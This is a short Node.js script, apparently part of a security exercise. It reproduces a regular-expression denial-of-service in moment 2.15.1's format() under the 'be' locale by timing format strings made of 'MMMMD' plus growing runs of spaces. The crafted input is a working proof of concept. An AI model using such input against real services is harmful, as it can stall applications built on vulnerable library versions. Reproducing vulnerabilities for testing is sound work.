// Minimal ReDoS reproducer for moment 2.15.1 format() under locale 'be'.
// Run from the exercise2 directory:  node val/repro.js
const moment = require('moment');
moment.locale('be');

const sizes = [25, 28, 30, 32, 34];
for (const n of sizes) {
  const fmt = 'MMMMD' + ' '.repeat(n);
  const t0 = Date.now();
  moment().format(fmt);
  console.log(`${n} spaces -> ${Date.now() - t0} ms`);
}
